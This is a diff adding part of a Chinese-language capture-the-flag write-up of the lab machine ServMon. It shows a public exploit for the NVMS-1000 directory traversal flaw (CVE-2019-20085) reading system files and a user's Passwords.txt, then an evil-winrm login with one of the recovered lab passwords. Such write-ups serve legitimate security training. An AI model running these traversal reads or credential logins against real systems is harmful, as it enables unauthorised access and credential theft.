@@ -96,8 +96,60 @@ Nadine
 有点CTF的意思了。。。
 
 根据提示有一个secure folder存放了Nathan修改后的password，这个密码可以用来登录NVMS后台
+Nathan的桌面上有一个Passwords.txt文件
 
 
+## 目录遍历
+80端口的cms叫做```NVMS-10000```，经查看存在一个目录遍历漏洞
 
+我在github上找到了[这个](https://github.com/AleDiBen/NVMS1000-Exploit)漏洞编号为``` CVE - 2019-20085```的exp
 
-smbmap -H 10.10.10.184 -u Nadine 
+尝试读取```Windows/system.ini```文件
+
+```
+┌──(root💀kali)-[~/htb/ServMon]
+└─# ./nvms.py 10.10.10.184 Windows/system.ini win.ini
+[+] DT Attack Succeeded
+[+] Saving File Content
+[+] Saved
+[+] File Content
+
+++++++++++ BEGIN ++++++++++
+; for 16-bit app support                                                                                                                                                                                                                    
+[386Enh]                                                                                                  
+woafont=dosapp.fon                                                                                            
+EGA80WOA.FON=EGA80WOA.FON                                                                                           
+EGA40WOA.FON=EGA40WOA.FON                                                                                            
+CGA80WOA.FON=CGA80WOA.FON                                                                                            
+CGA40WOA.FON=CGA40WOA.FON    
+[drivers]                                                                                                          
+wave=mmdrv.dll                                                                                                        
+timer=timer.drv                                                                                                  
+[mci]                                                                                                                                                                                                                                   
+++++++++++  END  ++++++++++     
+```
+
+成功读取，现在读取Nathan桌面下的Passwords.txt
+```
+┌──(root💀kali)-[~/htb/ServMon]
+└─# ./nvms.py 10.10.10.184 users/Nathan/Desktop/Passwords.txt Passwords.txt
+[+] DT Attack Succeeded
+[+] Saving File Content
+[+] Saved
+[+] File Content
+
+++++++++++ BEGIN ++++++++++
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+                                                                                           
+++++++++++  END  ++++++++++  
+```
+
+现在我们找到了一个密码字典，根据ftp的提示，其中一个是
+
+evil-winrm -u 'nathan' -p '1nsp3ctTh3Way2Mars!' -i 10.10.10.184
